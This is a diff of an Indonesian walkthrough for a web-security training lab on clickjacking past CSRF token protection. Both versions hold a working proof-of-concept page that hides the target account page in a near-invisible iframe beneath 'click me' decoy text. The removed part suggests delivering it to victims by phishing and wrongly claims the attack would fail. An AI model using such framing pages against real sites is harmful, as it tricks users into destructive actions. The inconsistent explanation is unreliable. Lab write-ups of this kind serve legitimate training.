@@ -1,22 +1,18 @@
-# Clickjacking Dasar dengan Perlindungan Token CSRF
-
+# Clickjacking Dasar dengan Proteksi Token CSRF | 2 Jan 2022
 ## Latar Belakang
-Lab ini berisi fungsi login dan tombol hapus akun yang dilindungi oleh token CSRF. Seorang pengguna akan mengklik elemen yang menampilkan kata "klik" di situs web umpan.
+Lab ini berisi fungsionalitas login dan tombol hapus akun yang dilindungi oleh token CSRF. Seorang pengguna akan mengklik elemen yang menampilkan kata "click" di situs web umpan.
 
-Untuk menyelesaikan lab, buat beberapa HTML yang membingkai halaman akun dan menipu pengguna untuk menghapus akun mereka. Lab dianggap selesai ketika akun dihapus.
+Untuk menyelesaikan lab ini, buat beberapa HTML yang membingkai halaman akun dan menipu pengguna agar menghapus akun mereka. Lab ini dianggap selesai ketika akun dihapus.
 
-Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: wiener:peter
+Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: `wiener:peter`
 
 ## Eksploitasi
-Masuk sebagai pengguna wiener:
-
-
-
+### Login sebagai pengguna wiener:
+![Login Screenshot](path_to_login_image)
 
 Di sini, kita dapat memperbarui email dan menghapus akun.
 
-Lihat sumber halaman:
-
+### Lihat sumber halaman:
 ```html
 <div id=account-content>
     <p>Your username is: wiener</p>
@@ -32,15 +28,15 @@ Lihat sumber halaman:
     </form>
 </div>
 ```
+Mereka menggunakan token CSRF untuk mencoba mencegah serangan CSRF.
 
-Juga, mereka menggunakan token CSRF untuk mencoba mencegah serangan CSRF.
-
-Sekarang, mari kita bangun sebuah `<iframe>` tersembunyi dan teks clickbait:
+### Membangun POC Clickjacking
+Sekarang, kita akan membangun `<iframe>` tersembunyi dan teks clickbait:
 
 ```html
 <html>
     <head>
-        <title>Clickjacking Dasar dengan Perlindungan Token CSRF</title>
+        <title>Basic clickjacking with CSRF token protection</title>
         <style type="text/css">
             #targetWebsite {
                 position:relative;
@@ -59,65 +55,17 @@ Sekarang, mari kita bangun sebuah `<iframe>` tersembunyi dan teks clickbait:
         </style>
     </head>
     <body>
-        <div id="decoyWebsite">Klik saya</div>
+        <div id="decoyWebsite">Click me</div>
         <iframe id="targetWebsite" src="https://0a2f006904c03654c0f5634d009f00aa.web-security-academy.net/my-account"></iframe>
     </body>
 </html>
 ```
 
-Kemudian, host halaman tersebut di server exploit, dan kirimkan ke korban:
+### Hosting dan Pengiriman ke Korban
+Setelah HTML POC dibuat, host di server exploit dan kirimkan ke korban.
 
+![Exploit Server Screenshot](path_to_exploit_server_image)
 
+### Titik Endpoint dari Eksploitasi
+Endpoint eksploitasi utama terdapat pada form hapus akun yang menerima permintaan POST ke `/my-account/delete` dengan token CSRF yang valid. Dengan memanipulasi `<iframe>` sehingga permintaan hapus akun dikirim tanpa sepengetahuan pengguna, exploit ini berhasil melewati perlindungan token CSRF karena iframe tersembunyi memiliki tingkat opasitas yang hampir tidak terlihat, memungkinkan serangan clickjacking berhasil.
 
-
-Kita berhasil!
-
-# Apa yang telah kita pelajari:
-Clickjacking dasar dengan perlindungan token CSRF
-
-# PoC (Proof of Concept)
-
-Untuk membuat Proof of Concept (PoC) dari clickjacking dasar dengan perlindungan token CSRF seperti yang dijelaskan di atas, ikuti langkah-langkah berikut:
-
-1. **Buat Halaman Eksploitasi:**
-   Buat file HTML dengan kode berikut dan simpan sebagai `exploit.html`:
-
-   ```html
-   <html>
-       <head>
-           <title>Clickjacking Dasar dengan Perlindungan Token CSRF</title>
-           <style type="text/css">
-               #targetWebsite {
-                   position:relative;
-                   width:700px;
-                   height:700px;
-                   opacity:0.0001;
-                   z-index:2;
-               }
-
-               #decoyWebsite {
-                   position:absolute;
-                   top:495px;
-                   left:60px;
-                   z-index:1;
-               }
-           </style>
-       </head>
-       <body>
-           <div id="decoyWebsite">Klik saya</div>
-           <iframe id="targetWebsite" src="https://0a2f006904c03654c0f5634d009f00aa.web-security-academy.net/my-account"></iframe>
-       </body>
-   </html>
-   ```
-
-2. **Host Halaman Eksploitasi:**
-   Unggah file `exploit.html` ke server exploit Anda. Anda dapat menggunakan server lokal atau layanan hosting web yang Anda miliki.
-
-3. **Distribusikan Eksploitasi:**
-   Kirimkan tautan ke `exploit.html` kepada korban, misalnya melalui email phishing atau media sosial.
-
-4. **Aktivasi Eksploitasi:**
-   Ketika korban mengunjungi halaman exploit, mereka akan melihat teks "Klik saya". Ketika mereka mengklik teks tersebut, sebenarnya mereka mengklik tombol "Hapus akun" di dalam iframe yang hampir tidak terlihat. Karena token CSRF sudah terlindungi, serangan ini tidak akan berhasil dalam konteks yang aman, tetapi ini menunjukkan bagaimana clickjacking dapat dilakukan.
-
-5. **Konfirmasi Hapus Akun:**
-   Jika serangan berhasil (yang seharusnya tidak terjadi karena perlindungan CSRF), akun pengguna akan dihapus, dan lab dianggap selesai.
